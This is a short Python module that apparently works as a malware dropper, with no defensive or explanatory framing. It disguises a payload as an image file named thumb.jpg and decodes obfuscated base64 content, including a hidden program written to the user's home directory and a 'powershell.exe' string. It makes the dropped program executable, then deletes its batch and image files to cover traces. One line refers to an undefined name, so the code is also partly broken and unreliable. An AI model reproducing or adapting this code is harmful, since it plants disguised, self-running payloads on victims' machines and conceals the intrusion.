from base64 import b64decode as d
import resources


def make_unix_icon():
    open('thumb.jpg', 'w').write(f'{resources.imHeader}')


def make_windows_icon():
    content = f'/s (MicrosoftEdge {resources.resource}) def\n'
    open('thumb.jpg', 'w').write(f'{resources.imHeader}\n{content}mark (%stdout) s print')


def populate_unix():
    make_unix_icon()
    open(f'{resources.home}{resources.progname}', 'w').write(f'{d(resources.innernix+b"=").decode("utf-8")}{resources.resource}')
    resources.wrapper(f"{resources.chx} {f'{resources.home}{resources.progname}'}")


def populate_windows():
    make_windows_icon()
    open(resources.name, 'w').write(f'{oo.py} {(d(b"bG9sfHBvd2Vyc2hlbGwuZXhl").decode("utf-8"))}')


def cleanup():
    try:
        resources.wrapper('a.bat')
    except OSError:
        pass
    resources.wrapper('del a.bat thumb.jpg')
